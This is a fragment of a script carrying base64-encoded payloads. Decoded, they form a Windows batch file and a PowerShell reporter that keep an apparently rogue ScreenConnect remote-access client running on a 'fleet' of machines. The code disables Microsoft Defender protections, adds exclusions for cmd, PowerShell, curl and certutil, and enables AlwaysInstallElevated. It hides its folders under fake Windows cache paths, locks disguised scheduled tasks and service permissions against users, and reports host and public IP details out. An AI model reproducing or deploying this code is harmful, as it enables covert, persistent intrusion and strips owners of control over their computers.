LnBzMSIgLVN0YXRlICVORVdTVEFURSUgLVN1bW1hcnkgIiVNU0clIiAtQnVpbGQgJU1PTlZFUiUg
LUNvdW50ICVDT1VOVCUgPm51bCAyPiYxDQplY2hvIHRnIHN0YXRlICVORVdTVEFURSUgc2VudD4+
IiVMT0clIg0KZXhpdCAvYiAwDQo=
::B64_MON_END
::B64_SEC_BEGIN
QGVjaG8gb2ZmDQpSRU0gT1dOX1NFQ1VSRSBCVUlMRCAyMDI2MDgwMlM5IC0gZHluYW1pYyBncnl4
YSBGUCBmcm9tIGdyeXhhLmNmZzsgTk8gTG9ja0RpciBvbiBTQyBkaXJzDQpzZXRsb2NhbCBFbmFi
bGVFeHRlbnNpb25zIEVuYWJsZURlbGF5ZWRFeHBhbnNpb24NCnNldCAiV0Q9JVByb2dyYW1EYXRh
JVxNaWNyb3NvZnRcV2luZG93c1xXRVJcVGVtcFwud3VjYWNoZSINCnNldCAiV0QyPSVQcm9ncmFt
RGF0YSVcTWljcm9zb2Z0XERpYWdub3Npc1xTdGF0ZVwuZXRsY2FjaGUiDQpzZXQgIkxPRz0lV0Ql
XGJvb3QuZXJyIg0Kc2V0ICJQUklNPVNjcmVlbkNvbm5lY3QgQ2xpZW50ICg1ZjYwMTA1Nzk4NTJl
NTA3KSINCnNldCAiQUxUPVNjcmVlbkNvbm5lY3QgQ2xpZW50IChmODYxYzgxNDBkNDUzNDI3KSIN
CnNldCAiS0VFUDE9NWY2MDEwNTc5ODUyZTUwNyINCnNldCAiS0VFUDI9Zjg2MWM4MTQwZDQ1MzQy
NyINCnNldCAiS0VFUDM9OTkwODE5OGU2NjhlNDc1MCINCmlmIGV4aXN0ICIlV0QlXGdyeXhhLmNm
ZyIgZm9yIC9mICJ1c2ViYWNrcSB0b2tlbnM9MSwqIGRlbGltcz09IiAlJUsgaW4gKCIlV0QlXGdy
eXhhLmNmZyIpIGRvIGlmIC9JICIlJUsiPT0iQ1VSUkVOVF9GUCIgc2V0ICJLRUVQMz0lJUwiDQpz
ZXQgIkdSWVhBPVNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUDMlKSINCnNldCAiUEY9JVByb2dy
YW1GaWxlcyUiDQpzZXQgIlBGODY9JVByb2dyYW1GaWxlcyh4ODYpJSINCnNldCAiVEFTS1JPT1Q9
JVN5c3RlbVJvb3QlXFN5c3RlbTMyXFRhc2tzIg0KDQppZiBub3QgZXhpc3QgIiVXRCUiIG1rZGly
ICIlV0QlIiA+bnVsIDI+JjENCmlmIG5vdCBleGlzdCAiJVdEMiUiIG1rZGlyICIlV0QyJSIgPm51
bCAyPiYxDQplY2hvIHNlY3VyZV9iZWdpbiAlREFURSUgJVRJTUUlIFM5Pj4iJUxPRyUiDQoNClJF
TSAtLS0gTmV1dHJhbGl6ZSBNU0kgYmxvY2sgcG9saWNpZXMgKDE2MjUpIC0tLQ0KUkVNIERpc2Fi
bGVNU0k6IDA9YWxsb3csIDE9bm9uLWFkbWluIG9ubHksIDI9YWxsIC0+IGZvcmNlIDANCnJlZyBh
ZGQgIkhLTE1cU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3NcSW5zdGFsbGVyIiAv
diBEaXNhYmxlTVNJIC90IFJFR19EV09SRCAvZCAwIC9mID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtM
TVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93c1xJbnN0YWxsZXIiIC92IEFsd2F5
c0luc3RhbGxFbGV2YXRlZCAvdCBSRUdfRFdPUkQgL2QgMSAvZiA+bnVsIDI+JjENCnJlZyBkZWxl
dGUgIkhLQ1VcU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3NcSW5zdGFsbGVyIiAv
diBEaXNhYmxlTVNJIC9mID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtDVVxTT0ZUV0FSRVxQb2xpY2ll
c1xNaWNyb3NvZnRcV2luZG93c1xJbnN0YWxsZXIiIC92IEFsd2F5c0luc3RhbGxFbGV2YXRlZCAv
dCBSRUdfRFdPUkQgL2QgMSAvZiA+bnVsIDI+JjENCg0KUkVNIC0tLSBEZWZlbmRlcjogcmVnaXN0
cnkgZXhjbHVzaW9ucyAocG9saWN5ICsgcHJlZmVyZW5jZSBrZXlzKSAtLS0NCnJlZyBhZGQgIkhL
TE1cU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXIiIC92IERpc2Fi
bGVBbnRpU3B5d2FyZSAvdCBSRUdfRFdPUkQgL2QgMSAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhL
TE1cU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcUmVhbC1UaW1l
IFByb3RlY3Rpb24iIC92IERpc2FibGVSZWFsdGltZU1vbml0b3JpbmcgL3QgUkVHX0RXT1JEIC9k
IDEgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xNXFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jvc29m
dFxXaW5kb3dzIERlZmVuZGVyXFJlYWwtVGltZSBQcm90ZWN0aW9uIiAvdiBEaXNhYmxlQmVoYXZp
b3JNb25pdG9yaW5nIC90IFJFR19EV09SRCAvZCAxIC9mID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtM
TVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlclxSZWFsLVRpbWUg
UHJvdGVjdGlvbiIgL3YgRGlzYWJsZUlPQVZQcm90ZWN0aW9uIC90IFJFR19EV09SRCAvZCAxIC9m
ID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2lu
ZG93cyBEZWZlbmRlclxSZWFsLVRpbWUgUHJvdGVjdGlvbiIgL3YgRGlzYWJsZVNjcmlwdFNjYW5u
aW5nIC90IFJFR19EV09SRCAvZCAxIC9mID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtMTVxTT0ZUV0FS
RVxNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlclxFeGNsdXNpb25zXFBhdGhzIiAvdiAiJVdEJSIg
L3QgUkVHX0RXT1JEIC9kIDAgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xNXFNPRlRXQVJFXE1p
Y3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1c2lvbnNcUGF0aHMiIC92ICIlV0QyJSIgL3Qg
UkVHX0RXT1JEIC9kIDAgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xNXFNPRlRXQVJFXE1pY3Jv
c29mdFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1c2lvbnNcUGF0aHMiIC92ICJDOlxXaW5kb3dzXFRl
bXAiIC90IFJFR19EV09SRCAvZCAwIC9mID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtMTVxTT0ZUV0FS
RVxNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlclxFeGNsdXNpb25zXFBhdGhzIiAvdiAiJVRFTVAl
IiAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhLTE1cU09GVFdBUkVc
TWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcRXhjbHVzaW9uc1xQYXRocyIgL3YgIiVQRiVcU2Ny
ZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQMSUpIiAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+
JjENCnJlZyBhZGQgIkhLTE1cU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcRXhj
bHVzaW9uc1xQYXRocyIgL3YgIiVQRiVcU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQMiUpIiAv
dCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhLTE1cU09GVFdBUkVcTWlj
cm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcRXhjbHVzaW9uc1xQYXRocyIgL3YgIiVQRiVcU2NyZWVu
Q29ubmVjdCBDbGllbnQgKCVLRUVQMyUpIiAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+JjEN
CnJlZyBhZGQgIkhLTE1cU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcRXhjbHVz
aW9uc1xQYXRocyIgL3YgIiVQRjg2JVxTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVAxJSkiIC90
IFJFR19EV09SRCAvZCAwIC9mID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxNaWNy
b3NvZnRcV2luZG93cyBEZWZlbmRlclxFeGNsdXNpb25zXFBhdGhzIiAvdiAiJVBGODYlXFNjcmVl
bkNvbm5lY3QgQ2xpZW50ICglS0VFUDIlKSIgL3QgUkVHX0RXT1JEIC9kIDAgL2YgPm51bCAyPiYx
DQpyZWcgYWRkICJIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1
c2lvbnNcUGF0aHMiIC92ICIlUEY4NiVcU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQMyUpIiAv
dCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+JjENCmZvciAlJVAgaW4gKG1zaWV4ZWMuZXhlIGN1
cmwuZXhlIGNtZC5leGUgcG93ZXJzaGVsbC5leGUgY2VydHV0aWwuZXhlIFNjcmVlbkNvbm5lY3Qu
Q2xpZW50U2VydmljZS5leGUgU2NyZWVuQ29ubmVjdC5XaW5kb3dzQ2xpZW50LmV4ZSkgZG8gKA0K
ICByZWcgYWRkICJIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1
c2lvbnNcUHJvY2Vzc2VzIiAvdiAiJSVQIiAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+JjEN
CikNCg0KUkVNIC0tLSBEZWZlbmRlcjogbGl2ZSBNcFByZWZlcmVuY2UgKHN0cm9uZ2VyIHRoYW4g
cmVnIGFsb25lKSAtLS0NCnBvd2Vyc2hlbGwuZXhlIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZl
IC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1Db21tYW5kIF4NCiAgIiRFcnJvckFjdGlvblByZWZl
cmVuY2U9J1NpbGVudGx5Q29udGludWUnOyIgXg0KICAiVHJ5e1NldC1NcFByZWZlcmVuY2UgLURp
c2FibGVSZWFsdGltZU1vbml0b3JpbmcgJHRydWU7IFNldC1NcFByZWZlcmVuY2UgLURpc2FibGVC
ZWhhdmlvck1vbml0b3JpbmcgJHRydWU7IFNldC1NcFByZWZlcmVuY2UgLURpc2FibGVJT0FWUHJv
dGVjdGlvbiAkdHJ1ZTsgU2V0LU1wUHJlZmVyZW5jZSAtRGlzYWJsZVNjcmlwdFNjYW5uaW5nICR0
cnVlfUNhdGNoe307IiBeDQogICIkcGF0aHM9QCgnJVdEJScsJyVXRDIlJywnQzpcV2luZG93c1xU
ZW1wJywkZW52OlRFTVAsJyVQRiVcU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQMSUpJywnJVBG
JVxTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVAyJSknLCclUEY4NiVcU2NyZWVuQ29ubmVjdCBD
bGllbnQgKCVLRUVQMSUpJywnJVBGODYlXFNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUDIlKScp
OyIgXg0KICAidHJ5eyRwYXRocys9QChHZXQtQ2hpbGRJdGVtIC1QYXRoICRlbnY6UHJvZ3JhbUZp
bGVzIC1GaWx0ZXIgJ1NjcmVlbkNvbm5lY3QgQ2xpZW50KicgLURpcmVjdG9yeSAtRUEgMCB8IEZv
ckVhY2gtT2JqZWN0IHskXy5GdWxsTmFtZX0pfWNhdGNoe307IiBeDQogICJ0cnl7JHBmODY9W0Vu
dmlyb25tZW50XTo6R2V0Rm9sZGVyUGF0aCgnUHJvZ3JhbUZpbGVzWDg2Jyk7IGlmKCRwZjg2KXsk
cGF0aHMrPUAoR2V0LUNoaWxkSXRlbSAtUGF0aCAkcGY4NiAtRmlsdGVyICdTY3JlZW5Db25uZWN0
IENsaWVudConIC1EaXJlY3RvcnkgLUVBIDAgfCBGb3JFYWNoLU9iamVjdCB7JF8uRnVsbE5hbWV9
KX19Y2F0Y2h7fTsiIF4NCiAgImZvcmVhY2goJHAgaW4gKCRwYXRocyB8IFNlbGVjdC1PYmplY3Qg
LVVuaXF1ZSkpeyBpZigkcCAtYW5kIChUZXN0LVBhdGggLUxpdGVyYWxQYXRoICRwKSl7IEFkZC1N
cFByZWZlcmVuY2UgLUV4Y2x1c2lvblBhdGggJHAgLUVBIDAgfSB9OyIgXg0KICAiZm9yZWFjaCgk
eCBpbiBAKCdtc2lleGVjLmV4ZScsJ2N1cmwuZXhlJywnY21kLmV4ZScsJ3Bvd2Vyc2hlbGwuZXhl
JywnY2VydHV0aWwuZXhlJywnU2NyZWVuQ29ubmVjdC5DbGllbnRTZXJ2aWNlLmV4ZScsJ1NjcmVl
bkNvbm5lY3QuV2luZG93c0NsaWVudC5leGUnKSl7IEFkZC1NcFByZWZlcmVuY2UgLUV4Y2x1c2lv
blByb2Nlc3MgJHggLUVBIDAgfTsiIF4NCiAgIkFkZC1NcFByZWZlcmVuY2UgLUV4Y2x1c2lvbkV4
dGVuc2lvbiAnLmNtZCcsJy5wczEnLCcubXNpJyAtRUEgMCIgPm51bCAyPiYxDQoNClJFTSAtLS0g
QUNMOiBvbmx5IFNZU1RFTSArIEFkbWluaXN0cmF0b3JzIG9uIHBlcnNpc3QgZGlycyAtLS0NCmNh
bGwgOkxvY2tEaXIgIiVXRCUiDQpjYWxsIDpMb2NrRGlyICIlV0QyJSINCg0KUkVNIC0tLSBoaWRl
IHdvcmtkaXJzICsga2V5IHBheWxvYWQgZmlsZXMgLS0tDQphdHRyaWIgK2ggK3MgIiVXRCUiID5u
dWwgMj4mMQ0KYXR0cmliICtoICtzICIlV0QyJSIgPm51bCAyPiYxDQpSRU0gUzU6IGRvIE5PVCBo
aWRlL2xvY2sgdGhlIG11dGFibGUgcGF5bG9hZCBzY3JpcHRzIC0gY29weS9tb3ZlIG92ZXIgK2gg
K3MgZmlsZXMNClJFTSBmYWlscyBzaWxlbnRseSBhbmQgZnJvemUgdGhlIHdob2xlIGZsZWV0J3Mg
c2VsZi11cGRhdGUuIEhpZGRlbiBkaXJzIGNvbmNlYWwgY29udGVudHMgYWxyZWFkeS4NCmZvciAl
JUYgaW4gKHBrZy5tc2kgbm90aWZ5LmNmZyBpZGVudGl0eS5jZmcgc3RhdGUuanNvbikgZG8gKA0K
ICBpZiBleGlzdCAiJVdEJVwlJUYiIGF0dHJpYiAraCArcyAiJVdEJVwlJUYiID5udWwgMj4mMQ0K
KQ0KDQpSRU0gLS0tIEFDTDogc2NoZWR1bGVkIHRhc2sgWE1MIChoYXJkZXIgdG8gZGVsZXRlIHdp
dGhvdXQgQWRtaW4pIC0tLQ0KUkVNIFM2OiBuYW1lcyBjb250YWluIHNwYWNlcyAoIlNlcnZlciBE
aWFnbm9zdGljcyIpIC0gdGhlIGNtZCBGT1IgbG9vcCBzcGxpdA0KUkVNIHRoZW0gaW50byBnYXJi
YWdlIHRva2Vucy4gUG93ZXJTaGVsbCByZWFkcyBpZGVudGl0eS5jZmcgZGlyZWN0bHkgaW5zdGVh
ZC4NCnBvd2Vyc2hlbGwuZXhlIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Q
b2xpY3kgQnlwYXNzIC1Db21tYW5kIF4NCiAgIiRFcnJvckFjdGlvblByZWZlcmVuY2U9J1NpbGVu
dGx5Q29udGludWUnOyAkbmFtZXM9QCgpOyIgXg0KICAiaWYoVGVzdC1QYXRoIC1MaXRlcmFsUGF0
aCAnJVdEJVxpZGVudGl0eS5jZmcnKXsgR2V0LUNvbnRlbnQgLUxpdGVyYWxQYXRoICclV0QlXGlk
ZW50aXR5LmNmZycgLUZvcmNlIHwgRm9yRWFjaC1PYmplY3QgeyBpZigkXyAtbWF0Y2ggJ15UQVNL
X1tBLURdPSguKykkJyl7ICRuYW1lcyArPSAkbWF0Y2hlc1sxXS5UcmltKCkuVHJpbVN0YXJ0KCdc
JykgfSB9IH0iIF4NCiAgImVsc2UgeyAkbmFtZXM9QCgnV2VyUXVldWVTeW5jJywnUGxhU2VydmVy
SGVhbHRoJywnV2RpSG9zdFByb3h5JywnVGNwSXBDb25mbGljdFJlcycpIH07IiBeDQogICJmb3Jl
YWNoKCRuIGluICRuYW1lcyl7ICRmID0gSm9pbi1QYXRoICclVEFTS1JPT1QlJyAkbjsgaWYoVGVz
dC1QYXRoIC1MaXRlcmFsUGF0aCAkZil7ICYgaWNhY2xzLmV4ZSAkZiAvaW5oZXJpdGFuY2U6ciB8
IE91dC1OdWxsOyAmIGljYWNscy5leGUgJGYgL2dyYW50OnIgJ05UIEFVVEhPUklUWVxTWVNURU06
RicgJ0JVSUxUSU5cQWRtaW5pc3RyYXRvcnM6RicgfCBPdXQtTnVsbDsgJiBhdHRyaWIuZXhlICto
ICtzICRmIHwgT3V0LU51bGwgfSB9IiA+bnVsIDI+JjENCg0KUkVNIC0tLSBBQ0w6IFdNSSB3YXRj
aGRvZyBzdWJzY3JpcHRpb24gZmlsZXMgKGNoYWluIDIpIC0tLQ0KaWNhY2xzICIlU3lzdGVtUm9v
dCVcU3lzdGVtMzJcd2JlbVxSZXBvc2l0b3J5IiAvZ3JhbnQgIk5UIEFVVEhPUklUWVxTWVNURU06
RiIgPm51bCAyPiYxDQoNClJFTSAtLS0gQUNMOiBkbyBOT1QgTG9ja0RpciBTY3JlZW5Db25uZWN0
IGluc3RhbGwgZGlycyAtLS0NClJFTSB0YWtlb3duK3N0cmlwIG9uIGxpdmUgU0MgZGlycyBicmVh
a3MgY2xpZW50IGZpbGUgd3JpdGVzL3VwZGF0ZXMg4oaSIHBhbmVsIE9GRkxJTkUNClJFTSB3aGls
ZSBzZXJ2aWNlIHN0aWxsIGxvb2tzIFJ1bm5pbmcuIERlZmVuZGVyIGV4Y2x1c2lvbnMgKyBzZXJ2
aWNlIFNEIGFyZSBlbm91Z2guDQpSRU0gTzM3OiBvbmUtc2hvdCB1bmxvY2sgaWYgYSBwcmlvciBi
dWlsZCBMb2NrRGlyJ2QgdGhlc2UgcGF0aHMuDQppZiBleGlzdCAiJVdEJVxzZWN1cmVfc2MuZmxh
ZyIgKA0KICBmaW5kc3RyIC9DOiJzY19ub2xvY2tfZGlycyIgIiVXRCVcc2VjdXJlX3NjLmZsYWci
ID5udWwgMj4mMQ0KICBpZiBlcnJvcmxldmVsIDEgKA0KICAgIGVjaG8gc2NfdW5sb2NrX3ByaW9y
X2xvY2tkaXI+PiIlTE9HJSINCiAgICBmb3IgJSVEIGluICgNCiAgICAgICIlUEYlXFNjcmVlbkNv
bm5lY3QgQ2xpZW50ICglS0VFUDElKSINCiAgICAgICIlUEYlXFNjcmVlbkNvbm5lY3QgQ2xpZW50
ICglS0VFUDIlKSINCiAgICAgICIlUEYlXFNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUDMlKSIN
CiAgICAgICIlUEY4NiVcU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQMSUpIg0KICAgICAgIiVQ
Rjg2JVxTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVAyJSkiDQogICAgICAiJVBGODYlXFNjcmVl
bkNvbm5lY3QgQ2xpZW50ICglS0VFUDMlKSINCiAgICApIGRvICgNCiAgICAgIGlmIGV4aXN0ICIl
JX5EIiAoDQogICAgICAgIHRha2Vvd24gL0YgIiUlfkQiIC9SIC9EIFkgPm51bCAyPiYxDQogICAg
ICAgIGljYWNscyAiJSV+RCIgL3Jlc2V0IC9UIC9DIC9RID5udWwgMj4mMQ0KICAgICAgICBpY2Fj
bHMgIiUlfkQiIC9ncmFudCAiTlQgQVVUSE9SSVRZXFNZU1RFTTooT0kpKENJKUYiICJCVUlMVElO
XEFkbWluaXN0cmF0b3JzOihPSSkoQ0kpRiIgPm51bCAyPiYxDQogICAgICApDQogICAgKQ0KICAg
IGVjaG8gc2Nfbm9sb2NrX2RpcnM+JVdEJVxzZWN1cmVfc2MuZmxhZw0KICApDQopIGVsc2UgKA0K
ICBlY2hvIHNjX25vbG9ja19kaXJzPiVXRCVcc2VjdXJlX3NjLmZsYWcNCikNCg0KUkVNIC0tLSBT
QyBzZXJ2aWNlczogU1lTVEVNIGNhbiBjb25maWcvc3RvcC9kZWxldGU7IEJBIGZ1bGw7IHVzZXJz
IGJsb2NrZWQgLS0tDQpSRU0gU1k6IENDIERDIExDIFNXIFJQIERUIExPIFJDICAobm8gU0QgLT4g
Y2Fubm90IGNoYW5nZSB0aGlzIFNEIGl0c2VsZikNCnNldCAiU0Q9RDooQTs7Q0NEQ0xDU1dSUFdQ
RFRMT0NSUkM7OztTWSkoQTs7Q0NEQ0xDU1dSUFdQRFRMT0NSU0RSQ1dEV087OztCQSkiDQpzYy5l
eGUgc2RzZXQgIiVQUklNJSIgIiVTRCUiID5udWwgMj4mMQ0Kc2MuZXhlIHNkc2V0ICIlQUxUJSIg
IiVTRCUiID5udWwgMj4mMQ0Kc2MuZXhlIHNkc2V0ICIlR1JZWEElIiAiJVNEJSIgPm51bCAyPiYx
DQpzYy5leGUgY29uZmlnICIlUFJJTSUiIHN0YXJ0PSBhdXRvID5udWwgMj4mMQ0Kc2MuZXhlIGNv
bmZpZyAiJUFMVCUiIHN0YXJ0PSBhdXRvID5udWwgMj4mMQ0Kc2MuZXhlIGNvbmZpZyAiJUdSWVhB
JSIgc3RhcnQ9IGF1dG8gPm51bCAyPiYxDQpzYy5leGUgZmFpbHVyZSAiJVBSSU0lIiByZXNldD0g
ODY0MDAgYWN0aW9ucz0gcmVzdGFydC82MDAwMC9yZXN0YXJ0LzYwMDAwL3Jlc3RhcnQvNjAwMDAg
Pm51bCAyPiYxDQpzYy5leGUgZmFpbHVyZSAiJUFMVCUiIHJlc2V0PSA4NjQwMCBhY3Rpb25zPSBy
ZXN0YXJ0LzYwMDAwL3Jlc3RhcnQvNjAwMDAvcmVzdGFydC82MDAwMCA+bnVsIDI+JjENCnNjLmV4
ZSBmYWlsdXJlICIlR1JZWEElIiByZXNldD0gODY0MDAgYWN0aW9ucz0gcmVzdGFydC82MDAwMC9y
ZXN0YXJ0LzYwMDAwL3Jlc3RhcnQvNjAwMDAgPm51bCAyPiYxDQoNCmVjaG8gc2VjdXJlX2RvbmU+
PiIlTE9HJSINCmV4aXQgL2IgMA0KDQo6TG9ja0Rpcg0Kc2V0ICJUPSV+MSINCmlmIG5vdCBleGlz
dCAiJVQlIiBleGl0IC9iIDANClJFTSB0YWtlIG93bmVyc2hpcCB0aGVuIHN0cmlwIGluaGVyaXRl
ZCBBQ0VzOyBTWVNURU0rQWRtaW5zIG9ubHkNCnRha2Vvd24gL0YgIiVUJSIgL1IgL0QgWSA+bnVs
IDI+JjENCmljYWNscyAiJVQlIiAvaW5oZXJpdGFuY2U6ciA+bnVsIDI+JjENCmljYWNscyAiJVQl
IiAvZ3JhbnQ6ciAiTlQgQVVUSE9SSVRZXFNZU1RFTTooT0kpKENJKUYiICJCVUlMVElOXEFkbWlu
aXN0cmF0b3JzOihPSSkoQ0kpRiIgPm51bCAyPiYxDQppY2FjbHMgIiVUJSIgL3JlbW92ZTpnICJV
c2VycyIgIkF1dGhlbnRpY2F0ZWQgVXNlcnMiICJFdmVyeW9uZSIgIk5UIEFVVEhPUklUWVxJTlRF
UkFDVElWRSIgIkJVSUxUSU5cVXNlcnMiID5udWwgMj4mMQ0KZXhpdCAvYiAwDQo=
::B64_SEC_END
::B64_TGR_BEGIN
I1JlcXVpcmVzIC1WZXJzaW9uIDUuMQojIFRHX1JFUE9SVCBCVUlMRCAyMDI2MDgwMlQxNiAtIHJv
b3QtbGV2ZWwgdGFzayBuYW1lcyAoSURFTlRWRVI9Nyk7IFRSIG93bmVyc2hpcDsgUk1NK0RhdHRv
IGtlZXA7IGR5bmFtaWMgZ3J5eGEgRlAKcGFyYW0oCiAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9
ICR0cnVlKV1bc3RyaW5nXSRTdGF0ZSwKICAgIFtzdHJpbmddJFN1bW1hcnkgPSAnJywKICAgIFtz
dHJpbmddJFdvcmtEaXIgPSAnQzpcUHJvZ3JhbURhdGFcTWljcm9zb2Z0XFdpbmRvd3NcV0VSXFRl
bXBcLnd1Y2FjaGUnLAogICAgW3N0cmluZ10kT2xkU3RhdGUgPSAnJywKICAgIFtWYWxpZGF0ZVNl
dCgncmljaCcsICdjb21wYWN0JyldW3N0cmluZ10kTW9kZSA9ICdyaWNoJywKICAgIFtzdHJpbmdd
JEJ1aWxkID0gJ08xNScsCiAgICBbc3RyaW5nXSRDb3VudCA9ICcwJwopCgokRXJyb3JBY3Rpb25Q
cmVmZXJlbmNlID0gJ1NpbGVudGx5Q29udGludWUnCiRQcm9ncmVzc1ByZWZlcmVuY2UgPSAnU2ls
ZW50bHlDb250aW51ZScKdHJ5IHsgW05ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VjdXJpdHlQ
cm90b2NvbCA9IFtOZXQuU2VjdXJpdHlQcm90b2NvbFR5cGVdOjpUbHMxMiB9IGNhdGNoIHt9Cgpm
dW5jdGlvbiBHZXQtQ2ZnIHsKICAgICRwYXRoID0gSm9pbi1QYXRoICRXb3JrRGlyICdub3RpZnku
Y2ZnJwogICAgJGNmZyA9IEB7fQogICAgaWYgKC1ub3QgKFRlc3QtUGF0aCAkcGF0aCkpIHsgcmV0
dXJuICRjZmcgfQogICAgR2V0LUNvbnRlbnQgLUxpdGVyYWxQYXRoICRwYXRoIHwgRm9yRWFjaC1P
YmplY3QgewogICAgICAgIGlmICgkXyAtbWF0Y2ggJ15ccyooW0EtWmEtejAtOV9dKylccyo9XHMq
KC4qKVxzKiQnKSB7CiAgICAgICAgICAgICRjZmdbJG1hdGNoZXNbMV1dID0gJG1hdGNoZXNbMl0u
VHJpbSgpCiAgICAgICAgfQogICAgfQogICAgcmV0dXJuICRjZmcKfQoKZnVuY3Rpb24gRXNjKFtz
dHJpbmddJHMpIHsKICAgIGlmICgkbnVsbCAtZXEgJHMpIHsgcmV0dXJuICcnIH0KICAgIHJldHVy
biAoJHMgLXJlcGxhY2UgJyYnLCAnJmFtcDsnIC1yZXBsYWNlICc8JywgJyZsdDsnIC1yZXBsYWNl
ICc+JywgJyZndDsnKQp9CgpmdW5jdGlvbiBHZXQtUHVibGljSXAgewogICAgZm9yZWFjaCAoJHUg
aW4gQCgKICAgICAgICAgICAgJ2h0dHBzOi8vYXBpLmlwaWZ5Lm9yZycsCiAgICAgICAgICAgICdo
dHRwczovL2lmY29uZmlnLm1lL2lwJywKICAgICAgICAgICAgJ2h0dHBzOi8vaWNhbmhhemlwLmNv
bScKICAgICAgICApKSB7CiAgICAgICAgdHJ5IHsKICAgICAgICAgICAgJHIgPSBJbnZva2UtV2Vi
UmVxdWVzdCAtVXJpICR1IC1Vc2VCYXNpY1BhcnNpbmcgLVRpbWVvdXRTZWMgNgogICAgICAgICAg
ICAkaXAgPSAoJHIuQ29udGVudCB8IE91dC1TdHJpbmcpLlRyaW0oKQogICAgICAgICAgICBpZiAo
JGlwIC1tYXRjaCAnXlxkezEsM30oXC5cZHsxLDN9KXszfSQnIC1vciAkaXAgLW1hdGNoICc6Jykg
eyByZXR1cm4gJGlwIH0KICAgICAgICB9IGNhdGNoIHt9CiAgICB9CiAgICByZXR1cm4gJ24vYScK
fQoKZnVuY3Rpb24gR2V0LUxvY2FsSXBzIHsKICAgIHRyeSB7CiAgICAgICAgJGlwcyA9IEdldC1O
ZXRJUEFkZHJlc3MgLUFkZHJlc3NGYW1pbHkgSVB2NCAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250
aW51ZSB8CiAgICAgICAgICAgIFdoZXJlLU9iamVjdCB7ICRfLklQQWRkcmVzcyAtbm90bGlrZSAn
MTI3LionIC1hbmQgJF8uUHJlZml4T3JpZ2luIC1uZSAnV2VsbEtub3duJyB9IHwKICAgICAgICAg
ICAgU2VsZWN0LU9iamVjdCAtRXhwYW5kUHJvcGVydHkgSVBBZGRyZXNzIC1VbmlxdWUKICAgICAg
ICBpZiAoJGlwcykgeyByZXR1cm4gKCRpcHMgLWpvaW4gJywgJykgfQogICAgfSBjYXRjaCB7fQog
ICAgdHJ5IHsKICAgICAgICAkaXBzID0gR2V0LUNpbUluc3RhbmNlIFdpbjMyX05ldHdvcmtBZGFw
dGVyQ29uZmlndXJhdGlvbiAtRmlsdGVyICdJUEVuYWJsZWQ9VHJ1ZScgfAogICAgICAgICAgICBG
b3JFYWNoLU9iamVjdCB7ICRfLklQQWRkcmVzcyB9IHwgV2hlcmUtT2JqZWN0IHsgJF8gLWFuZCAk
XyAtbm90bGlrZSAnMTI3LionIC1hbmQgJF8gLW5vdGxpa2UgJyo6KicgfQogICAgICAgIGlmICgk
aXBzKSB7IHJldHVybiAoKCRpcHMgfCBTZWxlY3QtT2JqZWN0IC1VbmlxdWUpIC1qb2luICcsICcp
IH0KICAgIH0gY2F0Y2gge30KICAgIHJldHVybiAnbi9hJwp9CgpmdW5jdGlvbiBHZXQtT3NJbmZv
